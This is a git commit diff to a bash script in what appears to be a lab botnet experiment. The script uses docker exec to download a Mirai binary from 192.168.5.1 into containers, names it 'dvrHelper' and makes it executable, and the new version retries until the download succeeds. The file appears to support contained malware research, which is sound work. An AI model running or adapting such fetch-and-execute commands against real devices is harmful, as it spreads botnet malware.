acb161dbd629c8cda58bb32f06ae3937435c964f
labnet <savyovm@gmail.com>
2020-12-23 10:03:31 -0300

    add experiment counters

--- experiment/scripts/load_bot.sh
+++ experiment/scripts/load_bot.sh
@@ -1,2 +1,4 @@
 #!/bin/bash
-docker exec -w / -it bb$1 sh -c "/bin/busybox wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"
+#docker exec -w / -it bb$1 sh -c "/bin/busybox wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"
+#docker exec -w / bb$1 sh -c "/bin/busybox wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"
+docker exec -w / bb$1 sh -c "until wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; do sleep 5s; done; /bin/busybox chmod 777 ./dvrHelper"
